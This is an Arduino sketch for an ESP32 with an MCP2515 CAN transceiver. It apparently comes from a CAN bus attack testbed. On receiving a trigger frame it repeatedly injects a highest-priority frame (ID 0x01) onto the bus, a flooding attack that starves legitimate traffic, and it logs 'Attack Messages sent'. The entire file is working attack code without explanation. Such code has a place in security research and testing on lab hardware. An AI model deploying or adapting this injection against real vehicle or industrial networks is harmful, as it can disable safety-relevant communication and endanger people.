#include <SPI.h>
#include <mcp2515.h>

#define LED_BUILTIN 2  // LED pinout
#define ESP32_CS 5     // ESP32 Chip Set
struct can_frame attackMsg;
struct can_frame startMsg;
MCP2515 mcp2515(ESP32_CS);



void setup() {
  // put your setup code here, to run once:
  pinMode(LED_BUILTIN, OUTPUT);

  attackMsg.can_id = 0x01;
  attackMsg.can_dlc = 3;
  attackMsg.data[0] = 0xAA;
  attackMsg.data[1] = 0xBB;
  attackMsg.data[2] = 0xBB;

  Serial.begin(115200);
  mcp2515.reset();
  mcp2515.setBitrate(CAN_1000KBPS);  // ESP tx 1000KBPS as 500KBPS on device
  mcp2515.setNormalMode();
  Serial.println("Setup Ready !!");
}
bool isReady = false;
void loop() {
  // put your main code here, to run repeatedly:
  while (!isReady) {
    mcp2515.readMessage(&startMsg);
    if (startMsg.can_id == 0x123) {
      isReady = true;
    }
  }
  digitalWrite(LED_BUILTIN, HIGH);  //turn on LED
  // delay(500);
  if (mcp2515.sendMessage(&attackMsg) == MCP2515::ERROR_OK) {

    digitalWrite(LED_BUILTIN, LOW);
    // delay(500);
    Serial.println("Attack Messages sent");
  };
  mcp2515.readMessage(&startMsg);
  if (startMsg.can_id == 0x100) {
    isReady = false;
  }
}
